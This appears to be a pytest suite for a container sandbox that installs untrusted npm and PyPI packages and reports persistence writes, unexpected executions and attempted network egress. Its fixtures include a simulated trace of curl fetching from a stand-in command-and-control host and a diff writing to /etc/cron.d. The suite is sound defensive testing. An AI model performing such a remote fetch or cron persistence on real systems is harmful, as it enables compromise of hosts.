"""The component that runs untrusted code, and what it refuses to do.

Nothing here executes anything. The tests that matter most are about refusal:
the flag that has to be typed, the isolation that has to exist, and the fact
that neither has an override. Those are the properties that make the component
safe to ship, and they are testable without a container runtime -- which is
important, because a test suite that needs one would skip exactly the assertions
that matter on the machines that do not have one.

The parts that need a runtime are marked and skipped when it is absent, rather
than silently passing.
"""

from __future__ import annotations

import pytest

from cordon_sandbox import cli
from cordon_sandbox.isolation import Backend, IsolationError, available_backend
from cordon_sandbox.observe import (
    PERSISTENCE_PREFIXES,
    TRACE_SENTINEL,
    _interpret,
    _interpret_trace,
    _split_trace,
    install_command,
    traced_command,
)


def has_runtime() -> bool:
    try:
        available_backend()
    except IsolationError:
        return False
    return True


class TestItRefusesByDefault:
    def test_nothing_runs_without_the_flag(self, capsys) -> None:
        """The flag carries no information the command does not already imply.
        It exists so that running untrusted code is never something somebody
        did by accident."""
        assert cli.main(["pypi", "requests"]) == cli.BAD_INVOCATION
        assert "Pass --sandbox" in capsys.readouterr().err

    def test_the_refusal_explains_itself(self, capsys) -> None:
        cli.main(["npm", "left-pad"])
        assert "installs and runs the package you name" in capsys.readouterr().err

    def test_the_help_says_it_executes(self) -> None:
        text = cli.build_parser().format_help()
        assert "EXECUTES" in text


class TestItRefusesWithoutIsolation:
    def test_a_missing_runtime_is_an_error_not_a_warning(self, monkeypatch, capsys) -> None:
        """A sandbox that degrades to running untrusted code on the host when
        its backend is missing is worse than no sandbox, because the person who
        asked for it believes they are protected."""
        monkeypatch.setattr(
            "cordon_sandbox.cli.available_backend",
            lambda: (_ for _ in ()).throw(IsolationError("no container runtime is available")),
        )
        assert cli.main(["pypi", "requests", "--sandbox"]) == cli.FAILED
        assert "no container runtime" in capsys.readouterr().err

    def test_there_is_no_override(self) -> None:
        """Asserted against the parser rather than trusted to review: an
        `--allow-unsafe` added later would silently remove the property this
        whole component rests on."""
        options = cli.build_parser().format_help()
        for forbidden in ("--force", "--allow-unsafe", "--no-isolation", "--unsafe"):
            assert forbidden not in options

    def test_isolation_is_established_before_anything_is_downloaded(self, monkeypatch) -> None:
        """A missing runtime should be discovered before the network is
        touched, so a refusal costs nothing and leaks nothing."""
        order: list[str] = []

        def backend():
            order.append("isolation")
            raise IsolationError("none")

        def fetch(ecosystem, package):  # pragma: no cover - must not be reached
            order.append("fetch")
            raise AssertionError("fetched before isolation was established")

        monkeypatch.setattr("cordon_sandbox.cli.available_backend", backend)
        monkeypatch.setattr("cordon_sandbox.cli.fetch", fetch)
        cli.main(["pypi", "requests", "--sandbox"])
        assert order == ["isolation"]


class TestTheScannerCannotReachIt:
    def test_the_scanner_does_not_import_the_sandbox(self) -> None:
        """The scanner's promise is that it never executes what it scans, and a
        promise with an entry point into execution is not one."""
        import subprocess
        import sys

        probe = subprocess.run(
            [
                sys.executable,
                "-c",
                "import cordon_scanner, cordon_scanner.cli.main, sys; "
                "print(any(m.startswith('cordon_sandbox') for m in sys.modules))",
            ],
            capture_output=True,
            text=True,
            check=True,
        )
        assert probe.stdout.strip() == "False"


class TestWhatItSaysAboutIsolation:
    def test_a_rootless_runtime_says_so(self) -> None:
        claims = Backend(command="podman", version="5", rootless=True).guarantees
        assert any("rootless" in c for c in claims)

    def test_a_root_owned_runtime_says_that_is_weaker(self) -> None:
        claims = Backend(command="docker", version="27", rootless=False).guarantees
        assert any("weaker" in c for c in claims)

    def test_it_never_claims_a_read_only_root(self) -> None:
        """It used to, and the claim made the component useless: a payload
        writing to /etc/cron.d simply failed, and the run reported "the install
        failed" rather than "it tried to persist"."""
        for rootless in (True, False):
            claims = Backend(command="x", version="1", rootless=rootless).guarantees
            assert not any("read-only root" in c for c in claims)
            assert any("discarded afterwards" in c for c in claims)


class TestInterpretation:
    def test_writes_outside_the_install_tree_are_persistence(self) -> None:
        diff = "A /etc/cron.d/updater\nC /usr/local/bin\nA /work/site/six.py\n"
        kinds = [o.kind for o in _interpret(diff, 0, timed_out=False)]
        assert kinds == ["persistence"]

    def test_ordinary_install_writes_are_not_reported(self) -> None:
        diff = "A /work/site/six.py\nC /work\nA /tmp/pip-build\n"
        assert _interpret(diff, 0, timed_out=False) == []

    def test_a_timeout_says_what_was_not_observed(self) -> None:
        observations = _interpret("", -1, timed_out=True)
        assert observations[0].kind == "timeout"
        assert "not observed" in observations[0].detail

    def test_every_persistence_prefix_is_outside_a_package_tree(self) -> None:
        for prefix in PERSISTENCE_PREFIXES:
            assert not prefix.startswith(("/work", "/tmp"))


class TestInstallCommands:
    def test_lifecycle_scripts_are_left_enabled(self) -> None:
        """They are the reason to run anything at all. `--ignore-scripts` would
        produce a clean observation of a package whose whole payload is a
        postinstall hook."""
        _, npm = install_command("npm", "pkg.tgz")
        assert "--ignore-scripts" not in npm

    def test_the_install_reads_the_local_artefact_not_the_network(self) -> None:
        _, pip = install_command("pypi", "pkg.tar.gz")
        assert "--no-index" in pip
        _, npm = install_command("npm", "pkg.tgz")
        assert "--offline" in npm

    def test_an_unknown_ecosystem_is_refused(self) -> None:
        with pytest.raises(IsolationError):
            install_command("cargo", "pkg.crate")


@pytest.mark.skipif(not has_runtime(), reason="no container runtime available")
class TestAgainstARealRuntime:
    def test_a_backend_reports_a_version(self) -> None:
        backend = available_backend()
        assert backend.version
        assert backend.command


class TestTheSyscallTrace:
    """What the install ran and what it tried to reach.

    Nothing here starts a container. The trace is a text format, the parser is
    the part that can be wrong, and the shapes it has to survive are exactly
    the ones a real `strace -f` emits.
    """

    EXEC = (
        '2841 execve("/usr/bin/curl", ["curl", "-s", "http://c2.example/x"], 0x7ffd) = 0\n'
        '2841 execve("/bin/sh", ["sh", "-c", "install"], 0x7ffd) = 0\n'
        '2842 execve("/usr/bin/gcc", ["gcc", "-c", "ext.c"], 0x7ffd) = 0\n'
    )
    CONNECT = (
        "2841 connect(5, {sa_family=AF_INET, sin_port=htons(443), "
        'sin_addr=inet_addr("203.0.113.9")}, 16) = -1 ENETUNREACH\n'
    )
    LOOPBACK = (
        "2841 connect(5, {sa_family=AF_INET, sin_port=htons(8080), "
        'sin_addr=inet_addr("127.0.0.1")}, 16) = 0\n'
    )

    def test_a_program_the_build_did_not_need_is_reported(self) -> None:
        kinds = {o.kind: o.detail for o in _interpret_trace(self.EXEC, traced=True)}
        assert "executed" in kinds
        assert "/usr/bin/curl" in kinds["executed"]

    def test_the_toolchain_is_not(self) -> None:
        """An install that compiles an extension runs a compiler, a linker and
        a shell. Reporting those is reporting that a build happened."""
        detail = next(
            o.detail for o in _interpret_trace(self.EXEC, traced=True) if o.kind == "executed"
        )
        assert "gcc" not in detail
        assert "/bin/sh" not in detail

    def test_an_attempted_connection_is_recorded_even_though_it_failed(self) -> None:
        """There is no network interface in the container, so the call could
        not have succeeded. That it was made is the observation."""
        kinds = {o.kind: o.detail for o in _interpret_trace(self.CONNECT, traced=True)}
        assert "attempted_egress" in kinds
        assert "203.0.113.9" in kinds["attempted_egress"]
        assert "443" in kinds["attempted_egress"]

    def test_loopback_is_a_build_talking_to_itself(self) -> None:
        assert not [
            o for o in _interpret_trace(self.LOOPBACK, traced=True) if o.kind == "attempted_egress"
        ]

    def test_an_ipv6_address_is_read_too(self) -> None:
        trace = '2841 connect(5, {sa_family=AF_INET6, inet_pton(AF_INET6, "2001:db8::1", &sin6_addr)}, 28) = -1\n'
        kinds = {o.kind for o in _interpret_trace(trace, traced=True)}
        assert "attempted_egress" in kinds

    def test_an_ordinary_install_says_nothing(self) -> None:
        trace = '2841 execve("/bin/sh", ["sh", "-c", "x"], 0x7ffd) = 0\n'
        assert _interpret_trace(trace, traced=True) == []

    def test_an_untraced_run_says_so_rather_than_saying_nothing_happened(self) -> None:
        """The invariant the whole project is built on: a check that did not
        run must never look like a check that found nothing."""
        observations = _interpret_trace("", traced=False)
        assert [o.kind for o in observations] == ["not_traced"]
        assert "not observed" in observations[0].detail


class TestTheTracedCommand:
    def test_the_installs_exit_status_survives_the_trace_dump(self) -> None:
        """A non-zero exit is itself an observation, and `echo` after the
        install would otherwise overwrite it with zero."""
        command = traced_command("pip install x")
        assert command.rstrip().endswith("exit $rc")

    def test_it_falls_back_to_running_untraced(self) -> None:
        """`strace` exits non-zero when the host denies ptrace. An install that
        did not happen is worth less than one that happened unobserved."""
        assert traced_command("pip install x").count("pip install x") == 2

    def test_the_trace_follows_the_sentinel(self) -> None:
        command = traced_command("pip install x")
        assert command.index(TRACE_SENTINEL) < command.index("head -c")


class TestSplittingTheOutput:
    def test_the_installers_output_stops_at_the_sentinel(self) -> None:
        output, trace = _split_trace(f"Successfully installed x\n{TRACE_SENTINEL}\n2841 execve(\n")
        assert output.strip() == "Successfully installed x"
        assert "execve" in trace

    def test_output_with_no_sentinel_yields_no_trace(self) -> None:
        """A container killed at the wall clock never printed it, and reading
        the install's own output as a trace would report whatever it happened
        to contain."""
        output, trace = _split_trace("Killed\n")
        assert (output, trace) == ("Killed\n", "")


class TestWhatTheBackendPromises:
    def test_an_untraced_backend_says_so_in_its_guarantees(self) -> None:
        claims = Backend(command="docker", version="1", rootless=False).guarantees
        assert any("NOT traced" in c for c in claims)

    def test_a_traced_one_says_that(self) -> None:
        claims = Backend(
            command="podman", version="1", rootless=True, traces_syscalls=True
        ).guarantees
        assert any("syscalls traced" in c for c in claims)

    def test_the_default_runtime_names_the_host_kernel_as_the_boundary(self) -> None:
        claims = Backend(command="docker", version="1", rootless=False).guarantees
        assert any("host kernel is the boundary" in c for c in claims)

    def test_gvisor_is_named_when_it_is_what_ran(self) -> None:
        claims = Backend(command="docker", version="1", rootless=False, runtime="runsc").guarantees
        assert any("gVisor" in c for c in claims)
        assert not any("host kernel is the boundary" in c for c in claims)
